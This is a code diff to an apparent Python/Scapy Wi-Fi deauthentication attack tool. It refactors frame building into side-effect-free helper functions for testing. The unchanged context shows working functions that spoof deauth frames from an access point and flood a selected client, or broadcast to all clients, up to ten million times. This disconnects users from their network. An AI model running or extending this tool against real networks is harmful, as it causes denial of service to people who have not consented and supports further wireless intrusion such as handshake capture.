@@ -145,12 +145,29 @@ def scan_clients(interface, target_bssid):
     selection = int(input(f"\n{y}Select the client{r}:{y}"))
     return "0" if selection == 0 else list(unique_clients.keys())[selection - 1]
 
+def build_deauth_frame(target_mac, gateway_mac, reason=7):
+    """Build a single targeted deauthentication frame (no transmission).
+
+    Pure/side-effect-free so it can be exercised in tests with simulated
+    MAC addresses rather than a live interface.
+    """
+    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
+    return RadioTap() / dot11 / Dot11Deauth(reason=reason)
+
+def build_deauth_all_frame(target_bssid, reason=7):
+    """Build a single broadcast deauthentication frame (no transmission).
+
+    Pure/side-effect-free so it can be exercised in tests with simulated
+    MAC addresses rather than a live interface.
+    """
+    dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)
+    return RadioTap() / dot11 / Dot11Deauth(reason=reason)
+
 def deauth(target_mac, gateway_mac, interface):
     """Send deauthentication packets to the target MAC address."""
     os.system("clear")
     print(banner)
-    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
-    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
+    frame = build_deauth_frame(target_mac, gateway_mac)
     print(f"{y}Sending deauthentication packets to {b}{target_mac}{y} from {b}{gateway_mac}{y}:{g}\n")
     print(f"{y}Press {r}Ctrl + C {y}to stop{g}")
     sendp(frame, iface=interface, count=10000000, inter=0.1, verbose=1)
@@ -158,7 +175,7 @@ def deauth(target_mac, gateway_mac, interface):
 
 def deauthall(interface, target_bssid, count):
     """Send deauthentication packets to all clients connected to the target BSSID."""
-    packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
+    packet = build_deauth_all_frame(target_bssid)
     print(f"{y}Sending deauth packets to {b}{target_bssid}{y}:\n")
     print(f"{y}Press {r}Ctrl + C {y}to stop{g}")
     sendp(packet, iface=interface, count=count, inter=0.1, verbose=1)
